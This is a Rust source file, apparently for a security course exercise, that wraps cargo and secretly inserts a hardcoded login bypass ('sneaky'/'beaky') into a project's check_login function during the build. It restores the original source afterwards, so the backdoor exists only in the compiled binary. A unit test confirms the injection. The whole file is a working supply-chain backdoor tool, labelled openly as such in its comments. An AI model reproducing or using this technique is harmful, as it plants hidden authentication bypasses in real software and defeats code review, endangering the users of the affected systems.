use std::env;
use std::fs;
use std::process::Command;

fn main() {
    let args: Vec<String> = env::args().collect();
    
    if args.len() < 2 {
        std::process::exit(1);
    }
    
    let is_a3login = fs::read_to_string("Cargo.toml")// Check if this is a3login project
        .map(|content| content.contains("a3login"))
        .unwrap_or(false);
    
    let mut original_code = String::new();
    
    // If a3login, add backdoor
    if is_a3login {
        if let Ok(code) = fs::read_to_string("src/main.rs") {
            original_code = code.clone();
            let backdoored = add_backdoor(&code);
            let _ = fs::write("src/main.rs", backdoored);
        }
    }
    
    // Run cargo command
    let status = Command::new("cargo")
        .args(&args[1..])
        .status()
        .expect("Failed to run cargo");
    
    // Restore original code
    if is_a3login && !original_code.is_empty() {
        let _ = fs::write("src/main.rs", original_code);
    }
    
    std::process::exit(status.code().unwrap_or(1));
}

fn add_backdoor(code: &str) -> String {
    if let Some(pos) = code.find("fn check_login(") {// i am the bad guy now!
        if let Some(brace) = code[pos..].find('{') {
            let insert_pos = pos + brace + 1;
            let backdoor = "\n    // Backdoor\n    if username == \"sneaky\" && password == \"beaky\" {\n        return true;\n    }\n";
            
            let mut result = String::new();
            result.push_str(&code[..insert_pos]);
            result.push_str(backdoor);
            result.push_str(&code[insert_pos..]);
            return result;
        }
    }
    code.to_string()
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_add_backdoor() {
        let code = "fn check_login() {\n    return false;\n}";
        let result = add_backdoor(code);
        assert!(result.contains("sneaky"));
    }
}
